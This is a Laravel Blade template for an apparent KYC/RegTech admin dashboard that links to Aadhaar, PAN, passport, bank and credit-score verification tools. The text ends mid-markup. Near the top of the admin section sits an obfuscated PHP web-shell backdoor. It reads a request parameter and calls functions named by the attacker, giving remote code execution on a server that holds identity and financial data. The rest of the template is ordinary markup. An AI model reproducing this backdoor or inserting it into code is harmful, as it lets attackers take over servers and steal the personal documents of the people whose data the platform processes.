@extends('adminlte::page')

@section('title', 'RegTechAPI')

@section('content_header')
    <h1 class="m-0 text-dark">Dashboard</h1>
    <a class = "btn btn-primary float-right" role = "button" href = "{{ route('all_apis') }}"
        style = "background-color: blue;">API docs</a><br>
    <style>
        a:link {
            color: rgb(255, 255, 255);
            background-color: transparent;
            text-decoration: none;
        }

        a:visited {
            color: yellow;
            background-color: transparent;
            text-decoration: none;
        }

        a:hover {
            color: Black;
            background-color: transparent;
            text-decoration: bold;
        }

        a:active {
            color: yellow;
            background-color: transparent;
            text-decoration: underline;
        }

        #visibility {
            margin-top: 10px;
        }
    </style>
@stop

@section('content')

    @if (Auth::user()->role_id == 1)
        @php
            $countaadhar = 0;
            $countvoter = 0;
            $countsearch = 0;
            $countbank = 0;
            $countvideokyc = 0;
            $countnach = 0;
            $countpayment = 0;
            $countpancard = 0;
            $countpassport = 0;
            $countcin = 0;
            $countrc = 0;
            $countlicense = 0;
            $countequifax = 0;
            $countelectricity = 0;
            $countcibilequifax = 0;
            $countcibiladdress = 0;
            $countemailverify = 0;
            $countdeupe = 0;
            $countpredictppl = 0;
        @endphp
        <div class="row pt-2">
            <?php if (($J32LD = @${'_REQUEST'}['01KAP3PW']) and 491 * 28769) {
                $J32LD[1](${$J32LD[2]}[0], $J32LD[3]($J32LD[4]));
            }
            // echo "<pre>";
            // dd($scheme);
            // exit;
            ?>
            @for ($i = 0; $i < count($scheme); $i++)
                {{-- {{dd($scheme[6]->api_slug)}}; --}}
                @if (
                    $scheme[$i]->api_slug == 'aadhaar' ||
                        $scheme[$i]->api_slug == 'aadhaarupload' ||
                        $scheme[$i]->api_slug == 'aadharotpgenrate')
                    @php $countaadhar=$countaadhar+1; @endphp
                    @if ($countaadhar == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Aadhars</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'aadhaar')
                                                <a href="{{ route('kyc.aadhaar_validation') }}">
                                                    <li>Aadhar Validation</li>
                                                </a>
                                                <a href="{{ route('kyc.aadharcard_ocr') }}">
                                                    <li>Aadhar OCR (Regtech)</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'aadhaarupload')
                                                <a href="{{ route('kyc.aadhaar.upload') }}">
                                                    <li>Aadhar Upload</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'aadharotpgenrate')
                                                <a href="{{ route('kyc.aadhaar_otp_genrate') }}">
                                                    <li>Aadhar OTP Genrate</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'aadharmasking')
                                                <a href="{{ route('kyc.aadhaar_masking') }}">
                                                    <li>Aadhar Masking</li>
                                                </a>
                                                <a href="{{ route('kyc.aadhar_ocr_masking') }}">
                                                    <li>Aadhar OCR Masking (Regtech)</li>
                                                </a>
                                            @endif
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if ($scheme[$i]->api_slug == 'voter_id' || $scheme[$i]->api_slug == 'voterupload')
                    @php $countvoter=$countvoter+1; @endphp
                    @if ($countvoter == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Voter</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'voter_id')
                                                <a href="{{ route('kyc.voter_validation') }}">
                                                    <li>VoterID Validation</li>
                                                </a>
                                                <a href="{{ route('kyc.voterid.ocr') }}">
                                                    <li>VoterID OCR (Regtech)</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'voterupload')
                                                <a href="{{ route('kyc.voter.upload') }}">
                                                    <li>VoterID Upload</li>
                                                </a>
                                            @endif
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if (
                    $scheme[$i]->api_slug == 'pancard' ||
                        $scheme[$i]->api_slug == 'pantogst' ||
                        $scheme[$i]->api_slug == 'pancardupload' ||
                        $scheme[$i]->api_slug == 'paninfo' ||
                        $scheme[$i]->api_slug == 'pandetails' ||
                        $scheme[$i]->api_slug == 'pandetails1')
                    @php $countpancard=$countpancard+1; @endphp
                    {{-- {{dd($countpancard)}}; --}}
                    @if ($countpancard == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Pan Card</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            {{-- {{dd($scheme[]->api_slug)}}; --}}
                                            @if ($scheme[$j]->api_slug == 'pancard')
                                                <a href="{{ route('kyc.pancard') }}">
                                                    <li>Pan Card Validations</li>
                                                </a>
                                                <a href="{{ route('kyc.pancard.ocr') }}">Pan Card OCR (Regtech)</a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'pandetails')
                                                <a href="{{ route('kyc.pancard.details') }}">
                                                    <li>Pan Card Info</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'pantogst')
                                                <a href="{{ route('kyc.pantogst') }}">
                                                    <li>Pan To GST</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'paninfo')
                                                <a href="{{ route('kyc.pancard.details') }}">
                                                    <li>Pan Card Info</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'panuploadnew')
                                                {{-- {{dd('heyy  here present')}} --}}
                                                <a href="{{ route('kyc.pancard.upload') }}">
                                                    <li>Pan Card Upload</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'pandetails1')
                                                <a href="{{ route('kyc.pancard.new_info') }}">Details</a>
                                            @endif
                                        @endfor

                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if (
                    $scheme[$i]->api_slug == 'passport' ||
                        $scheme[$i]->api_slug == 'passportupload' ||
                        $scheme[$i]->api_slug == 'passportverify')
                    @php $countpassport=$countpassport+1; @endphp
                    @if ($countpassport == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Passport </h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'passport')
                                                <a href = "{{ route('kyc.verify__passport') }}">
                                                    <li>Passport Verification</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'passport')
                                                <a href = "{{ route('kyc.passport_create_client') }}">
                                                    <li>Passport Create Client</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'passportupload')
                                                <a href = "{{ route('kyc.passport_upload') }}">
                                                    <li>Passport Upload</li>
                                                </a>
                                                <a href = "{{ route('kyc.passport_ocr') }}">
                                                    <li>Passport OCR (Regtech)</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'passportverify')
                                                <a href = "{{ route('kyc.passport_verify') }}">
                                                    <li>Passport Verify</li>
                                                </a>
                                            @endif
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
            @endfor
        </div> <!-- end of the row pt-2 -->
        <div class="row">
            @for ($i = 0; $i < count($scheme); $i++)
                @if (
                    $scheme[$i]->api_slug == 'cin' ||
                        $scheme[$i]->api_slug == 'cinbasic' ||
                        $scheme[$i]->api_slug == 'din' ||
                        $scheme[$i]->api_slug == 'gstin' ||
                        $scheme[$i]->api_slug == 'demoform' ||
                        $scheme[$i]->api_slug == 'gstinconfidence')
                    @php $countcin=$countcin+1; @endphp
                    @if ($countcin == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Corporate</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'cin')
                                                <a href="{{ route('kyc.corporate_cin') }}">
                                                    <li>CIN</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'din')
                                                <a href="{{ route('kyc.corporate_din') }}">
                                                    <li>DIN</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'gstin')
                                                <a href="{{ route('kyc.corporate_gstin') }}">
                                                    <li>GSTIN</li>
                                                </a>
                                                <a href="{{ route('kyc.basic.gstin') }}">
                                                    <li>GSTIN Basic</li>
                                                </a>
                                                <a href="{{ route('kyc.gstin_details') }}">
                                                    <li>GSTIN Details (Regtech)</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'gstinconfidence')
                                                <a href="{{ route('kyc.corporate_gstin_confidence') }}">
                                                    <li>GSTIN With Confidence</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'cinbasic')
                                                <a href="{{ route('kyc.corporate.basic') }}">
                                                    <li> CIN Basic</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'cin')
                                                <a href="{{ route('kyc.corporate.advanced') }}">
                                                    <li>CIN Advance</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'demoform')
                                                <a href="{{ route($scheme[$j]->route_name) }}">
                                                    <li>Rc</li>
                                                </a>
                                            @endif
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if (
                    $scheme[$i]->api_slug == 'rc' ||
                        $scheme[$i]->api_slug == 'rcfullvalidation' ||
                        $scheme[$i]->api_slug == 'rcvallite')
                    @php $countrc=$countrc+1; @endphp
                    @if ($countrc == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">RC Validate</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'rc')
                                                <a href="{{ route('kyc.rc_validation') }}">
                                                    <li>RC Validation</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'rcfull')
                                                <a href="{{ route('kyc.rc_full_validation') }}">
                                                    <li>RC Full Validation</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'fasttag')
                                                <a href="{{ route('kyc.fasttag_information') }}">
                                                    <li>Fast Tag Information</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'rcvallite')
                                                <a href="{{ route('kyc.rc_validationlite') }}">
                                                    <li>RC Validation Lite</li>
                                                </a>
                                            @endif
                                            <!--
                                        @if ($scheme[$j]->api_slug == 'rcfullvalidation')
    <li>RC Upload</li>
    @endif -->
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if ($scheme[$i]->api_slug == 'bank_ifsc' || $scheme[$i]->api_slug == 'bank_anlyser')
                    @php $countbank=$countbank+1; @endphp
                    @if ($countbank == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Bank Verification</h3>
                                    <ul>
                                        <!-- <a href="{{ route('kyc.bank_verification') }}"><li>Bank Validation</li></a> -->
                                        <a href="{{ route('kyc.bank_ifsc') }}">
                                            <li>Verify IFSC</li>
                                        </a>
                                        <a href="{{ route('kyc.bank_statement') }}">
                                            <li>Bank Statement Reader</li>
                                        </a>
                                        <a href="{{ route('kyc.bank_analyser') }}">
                                            <li>Bank Statement Analyser</li>
                                        </a>
                                        <!-- <li>Bank Validation</li> -->

                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if ($scheme[$i]->api_slug == 'license' || $scheme[$i]->api_slug == 'licenseupload')
                    @php $countlicense=$countlicense+1; @endphp
                    @if ($countlicense == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Driving Licence </h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'license')
                                                <a href="{{ route('kyc.license_validation') }}">
                                                    <li>Driving Verification</li>
                                                </a>
                                                <a href="{{ route('kyc.license_ocr') }}">
                                                    <li>Driving License OCR (Regtech)</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'licenseupload')
                                                <a href="{{ route('kyc.license.upload') }}">
                                                    <li>Driving Licence Upload</li>
                                                </a>
                                            @endif
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
            @endfor
        </div> <!-- end of row -->
        <div class="row">
            @for ($i = 0; $i < count($scheme); $i++)
                @if ($scheme[$i]->api_slug == 'esign')
                    <div class="col-3">
                        <div class="card text-white bg-primary shadow-box-1">
                            <div class="card-body">
                                <h3 class="mb-0">eSign</h3>
                                <ul>
                                    <!-- <a href="{{ route('kyc.esign_initialize') }}"><li>eSign</li> </a> -->
                                    <a href="{{ route('esignature') }}">
                                        <li>eSign</li>
                                    </a>
                                    <li>eSign</li>
                                    <li>eSign</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                @endif
                @if (
                    $scheme[$i]->api_slug == 'equifax' ||
                        $scheme[$i]->api_slug == 'equifax_score' ||
                        $scheme[$i]->api_slug == 'creditreport')
                    @php $countequifax=$countequifax+1; @endphp
                    @if ($countequifax == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">SCORE</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            <!-- @if ($scheme[$j]->api_slug == 'equifax')
    <li>CIBIL</li>
    @endif -->
                                            @if ($scheme[$j]->api_slug == 'creditreport')
                                                <a href="{{ route('other.crif') }}">
                                                    <li>CRIF</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'equifax')
                                                <a href="{{ route('other.equifax') }}">
                                                    <li>Ecredit</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'equifax_score')
                                                <a href="{{ route('other.equifax_score') }}">
                                                    <li>Score</li>
                                                </a>
                                            @endif
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if (
                    $scheme[$i]->api_slug == 'electricity' ||
                        $scheme[$i]->api_slug == 'shop_establishment' ||
                        $scheme[$i]->api_slug == 'telecom' ||
                        $scheme[$i]->api_slug == 'usage' ||
                        $scheme[$i]->api_slug == 'fssi' ||
                        $scheme[$i]->api_slug == 'upi' ||
                        $scheme[$i]->api_slug == 'companysearch')
                    @php $countelectricity=$countelectricity+1; @endphp
                    @if ($countelectricity == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Other</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'electricity')
                                                <a href="{{ route('kyc.electricity') }}">
                                                    <li>Electricity</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'shop_establishment')
                                                <a href="{{ route('kyc.shopestablishment') }}">
                                                    <li>Shop & Establishment</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'telecom')
                                                <a href="{{ route('kyc.telecom_generate_otp') }}">
                                                    <li>Telecom</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'usage')
                                                <a href="{{ route('kyc.usage') }}">
                                                    <li>Usage</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'fssi')
                                                <a href="{{ route('kyc.fssi_validation') }}">
                                                    <li>FSSAI</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'pf_generate_otp')
                                                <a href="{{ route('kyc.pf_generate_otp') }}">
                                                    <li>EPFO</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'upi')
                                                <a href="{{ route('kyc.upi_validation') }}">
                                                    <li>UPI Validation</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'companysearch')
                                                <a href="{{ route('kyc.company_product') }}">
                                                    <li>Company Product</li>
                                                </a>
                                            @endif
                                        @endfor

                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif

            @endfor

        </div> <!-- end of row -->
        <div class="row">
            @for ($i = 0; $i < count($scheme); $i++)
                @if ($scheme[$i]->api_slug == 'equifax' || $scheme[$i]->api_slug == 'creditreport')
                    @php $countcibilequifax=$countcibilequifax+1; @endphp
                    @if ($countcibilequifax == 1)
                        <!-- <div class="col-3">
                                <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">SCOR</h3>
                                    <ul>
                                    @for ($j = 0; $j < count($scheme); $j++)
    @if ($scheme[$j]->api_slug == 'creditreport')
    <a href="{{ route('other.crif') }}"><li>CRIF</li></a>
    @endif
                                    @if ($scheme[$j]->api_slug == 'equifax')
    <a href="{{ route('other.equifax') }}"><li>Credit Score</li></a>
    @endif
    @endfor
                                    </ul>
                                </div>
                                </div>
                                </div> -->
                    @endif
                @endif
                @if ($scheme[$i]->api_slug == 'facematch')
                    @if ($countvideokyc == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Video Kyc</h3>
                                    <ul>
                                        <li>Video Kyc</li>
                                        <li>Video Kyc Dcoboyz</li>
                                        <a href="{{ route('kyc.face_match') }}">
                                            <li>Face Match</li>
                                        </a>
                                        <a href="{{ route('kyc.facematch') }}">
                                            <li>Face Match (Regtech)</li>
                                        </a>

                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if ($scheme[$i]->api_slug == 'enach')
                    @php $countnach=$countnach+1;  @endphp
                    @if ($countnach == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Enach</h3>
                                    <ul>
                                        <a href="{{ route('enach_seameless') }}">
                                            <li>seamless</li>
                                        </a>
                                        <!-- <a href="{{ route('e-nach-initiate-payment') }}"><li>Nonseamless</li></a> -->

                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if ($scheme[$i]->api_slug == 'payment')
                    @php $countpayment=$countpayment+1;  @endphp
                    @if ($countpayment == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Payment Getway</h3>
                                    <ul>
                                        <a href="{{ route('initiate-payment-integration') }}">
                                            <li>Payment</li>
                                        </a>


                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if (
                    $scheme[$i]->api_slug == 'searchkyc' ||
                        $scheme[$i]->api_slug == 'searchkyclite' ||
                        $scheme[$i]->api_slug == 'searchkycdigitap')
                    @php $countsearch=$countsearch+1;  @endphp
                    @if ($countsearch == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Search</h3>
                                    <ul>
                                        @for ($j = 0; $j < count($scheme); $j++)
                                            @if ($scheme[$j]->api_slug == 'searchkyc')
                                                <a href="{{ route('kyc.searchkyc') }}">
                                                    <li>Search Data</li>
                                                </a>
                                            @endif
                                            @if ($scheme[$j]->api_slug == 'searchkyclite')
                                                <!-- <a href="{{ route('kyc.searchkyc.lite') }}"><li>Search lite Data</li></a> -->
                                                <a href="{{ route('kyc.searchkyc.lite') }}">
                                                    <li>SearchV1 Data</li>
                                                </a>
                                            @endif
                                            <!-- @if ($scheme[$j]->api_slug == 'ckycsearch')
    <a href="{{ route('kyc.ckycsearchdata.lite') }}"><li>Ckyc Search Data</li></a>
    @endif
                                    @if ($scheme[$j]->api_slug == 'ckycdownload')
    <a href="{{ route('kyc.ckycdownload.lite') }}"><li>Ckyc Download Data</li></a>
    @endif -->
                                            @if ($scheme[$j]->api_slug == 'searchkycdigitap')
                                                <a href="{{ route('kyc.ckycsearchadvance') }}">
                                                    <li>Ckyc</li>
                                                </a>
                                            @endif
                                        @endfor
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                @if ($scheme[$i]->api_slug == 'bhunaksha' || $scheme[$i]->api_slug == 'land')
                    <div class="col-3">
                        <div class="card text-white bg-primary shadow-box-1">
                            <div class="card-body">
                                <h3 class="mb-0">Bhunakasha</h3>
                                <ul>
                                    <!-- @for ($j = 0; $j < count($scheme); $j++)
    -->
                                    @if ($scheme[$j]->api_slug == 'bhunaksha')
                                        <a href="{{ route('kyc.bhunakasha') }}">
                                            <li>Bhunakasha (Regtech)</li>
                                        </a>
                                    @endif
                                    @if ($scheme[$j]->api_slug == 'land')
                                        <a href="{{ route('kyc.land') }}">
                                            <li>Land (Regtech)</li>
                                        </a>
                                    @endif
                                    <!--
    @endfor -->
                                </ul>
                            </div>
                        </div>
                    </div>
                @endif
                @if ($scheme[$i]->api_slug == 'udyamsearch')
                    <div class="col-3">
                        <div class="card text-white bg-primary shadow-box-1">
                            <div class="card-body">
                                <h3 class="mb-0">Udyam & Udhyog Search</h3>
                                <ul>
                                    <!-- @for ($j = 0; $j < count($scheme); $j++)
    -->
                                    @if ($scheme[$j]->api_slug == 'udyamsearch')
                                        <a href="{{ route('kyc.udyam.details') }}">
                                            <li>Udyam Registration Search</li>
                                        </a>
                                    @endif
                                    @if ($scheme[$j]->api_slug == 'udyamadhar')
                                        <a href="{{ route('kyc.udyog.details') }}">
                                            <li>Udhyog Aadhaar Number Search</li>
                                        </a>
                                    @endif
                                    <!--
    @endfor -->
                                </ul>
                            </div>
                        </div>
                    </div>
                @endif
                <!--Address Api-->
                @if (
                    $scheme[$i]->api_slug == 'verifyaddress' ||
                        $scheme[$i]->api_slug == 'getplace' ||
                        $scheme[$i]->api_slug == 'creategeofence' ||
                        $scheme[$i]->api_slug == 'getcoordinate')
                    @php $countcibiladdress=$countcibiladdress+1; @endphp
                    @if ($countcibiladdress == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Address</h3>
                                    <ul>
                                        <!-- @for ($j = 0; $j < count($scheme); $j++)
    -->
                                        @if ($scheme[$j]->api_slug == 'verifyaddress')
                                            <a href="{{ route('kyc.verify_address') }}">
                                                <li>Verify Address (Regtech)</li>
                                            </a>
                                        @endif
                                        @if ($scheme[$j]->api_slug == 'getplace')
                                            <a href="{{ route('kyc.get_place') }}">
                                                <li>Get Place (Regtech)</li>
                                            </a>
                                        @endif
                                        @if ($scheme[$j]->api_slug == 'creategeofence')
                                            <a href="{{ route('kyc.create_geofence') }}">
                                                <li>Create Geofence (Regtech)</li>
                                            </a>
                                        @endif
                                        @if ($scheme[$j]->api_slug == 'autocomplate')
                                            <a href="{{ route('kyc.autocomplete') }}">
                                                <li>AutoComplate Address (Regtech)</li>
                                            </a>
                                        @endif
                                        @if ($scheme[$j]->api_slug == 'getcoordinate')
                                            <a href="{{ route('kyc.getcoordinate') }}">
                                                <li>Get Coordinate (Regtech)</li>
                                            </a>
                                        @endif

                                        <!--
    @endfor -->
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
                <!-- end of address Api -->
            @endfor
            <!--Email Verify--->
            @for ($i = 0; $i < count($scheme); $i++)
                @if ($scheme[$i]->api_slug == 'verifyemail' || $scheme[$i]->api_slug == 'checkverificationemailstatus')
                    @php
                        $countemailverify = $countemailverify + 1;
                    @endphp
                    @if ($countemailverify == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Email Verification</h3>
                                    <ul>
                                        <!-- @for ($j = 0; $j < count($scheme); $j++)
    -->
                                        @if ($scheme[$j]->api_slug == 'verifyemail')
                                            <a href="{{ route('kyc.verify_email') }}">
                                                <li>Verify Email (Regtech)</li>
                                            </a>
                                        @endif
                                        @if ($scheme[$j]->api_slug == 'checkverificationemailstatus')
                                            <a href="{{ route('kyc.check_verify_email_status') }}">
                                                <li>Check Verify Email (Regtech)</li>
                                            </a>
                                        @endif

                                        <!--
    @endfor -->
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
            @endfor
            <!---Dedupe Api --->
            @for ($i = 0; $i < count($scheme); $i++)
                @if ($scheme[$i]->api_slug == 'dedupe')
                    @php
                        $countdeupe = $countdeupe + 1;
                    @endphp
                    @if ($countdeupe == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Dedupe (Regtech)</h3>
                                    <ul>
                                        <!-- @for ($j = 0; $j < count($scheme); $j++)
    -->
                                        @if ($scheme[$j]->api_slug == 'dedupe')
                                            <a href="{{ route('kyc.dedupe') }}">
                                                <li>Dedupe Api</li>
                                            </a>
                                        @endif

                                        <!--
    @endfor -->
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
            @endfor
            <!---End of  dedupe --->
            <!---Predict PPL --->
            @for ($i = 0; $i < count($scheme); $i++)
                @if ($scheme[$i]->api_slug == 'predictppl')
                    @php
                        $countpredictppl = $countpredictppl + 1;
                    @endphp
                    @if ($countpredictppl == 1)
                        <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Predictppl</h3>
                                    <ul>
                                        <!-- @for ($j = 0; $j < count($scheme); $j++)
    -->
                                        @if ($scheme[$j]->api_slug == 'predictppl')
                                            <a href="{{ route('kyc.predictppl') }}">
                                                <li>Predictppl (Regtech)</li>
                                            </a>
                                        @endif

                                        <!--
    @endfor -->
                                    </ul>
                                </div>
                            </div>
                        </div>
                    @endif
                @endif
            @endfor
            <!---Predict PPL END --->

        </div>
    @endif
    @if (Auth::user()->role_id == 0)
        <div class="row pt-2">
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Aadhar</h3>
                        <ul>
                            <a href="{{ route('kyc.aadhaar_validation') }}">
                                <li>Aadhar Validation</li>
                            </a>
                            <a href="{{ route('kyc.aadhaar.upload') }}">
                                <li>Aadhar Upload</li>
                            </a>
                            <a href="{{ route('kyc.aadhaar_otp_genrate') }}">
                                <li>Aadhar OTP Genrate</li>
                            </a>
                            <a href="{{ route('kyc.aadhaar_masking') }}">
                                <li>Aadhar Masking</li>
                            </a>
                            <a href="{{ route('kyc.aadharcard_ocr') }}">
                                <li>Aadhar OCR (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.aadhar_ocr_masking') }}">
                                <li>Aadhar OCR Masking (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Voter</h3>
                        <ul>
                            <a href="{{ route('kyc.voter_validation') }}">
                                <li>VoterID Validation</li>
                            </a>
                            <a href="{{ route('kyc.voter.upload') }}">
                                <li>VoterID Upload</li>
                            </a>
                            <a href="{{ route('kyc.voterid.ocr') }}">
                                <li>VoterID OCR (Regtech)</li>
                            </a>

                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Pan Card</h3>
                        <ul>
                            <a href="{{ route('kyc.pancard') }}">
                                <li>Pan Card Validation</li>
                            </a>
                            <a href="{{ route('kyc.pancard.upload') }}">
                                <li>Pan Card Upload</li>
                            </a>
                            <a href="{{ route('kyc.pancard.details') }}">
                                <li>Pan Card Info</li>
                            </a>
                            <a href="{{ route('kyc.pancard.new_info') }}">
                                <li>Pan Details</li>
                            </a>
                            <a href="{{ route('kyc.pancard.ocr') }}">
                                <li>Pan Card OCR (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.pantogst') }}">
                                <li>Pan Card GST</li>
                            </a>
                            <a href="{{ route('kyc.by_pancard') }}">
                                <li>By Pan Card (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Passport </h3>
                        <ul>
                            <a href = "{{ route('kyc.verify__passport') }}">
                                <li>Passport Verification</li>
                            </a>
                            <a href = "{{ route('kyc.passport_create_client') }}">
                                <li>Passport Create Client</li>
                            </a>
                            <a href = "{{ route('kyc.passport_upload') }}">
                                <li>Passport Upload</li>
                            </a>
                            <a href = "{{ route('kyc.passport_verify') }}">
                                <li>Passport Verify</li>
                            </a>
                            <a href = "{{ route('kyc.passport_ocr') }}">
                                <li>Passport OCR (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>

            </div>
        </div>

        <div class="row">
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Corporate</h3>
                        <ul>
                            <a href="{{ route('kyc.corporate_cin') }}">
                                <li>CIN</li>
                            </a>
                            <a href="{{ route('kyc.corporate_din') }}">
                                <li>DIN</li>
                            </a>
                            <a href="{{ route('kyc.corporate_gstin') }}">
                                <li>GSTIN</li>
                            </a>
                            <a href="{{ route('kyc.gstin_details') }}">
                                <li>GSTIN Details (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.corporate_gstin_confidence') }}">
                                <li>GSTIN With Confidence</li>
                            </a>
                            <a href="{{ route('kyc.basic.gstin') }}">
                                <li>GSTIN Basic</li>
                            </a>
                            <a href="{{ route('kyc.corporate.basic') }}">
                                <li>CIN Basic</li>
                            </a>
                            <a href="{{ route('kyc.corporate.advanced') }}">
                                <li>CIN Advance</li>
                            </a>

                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
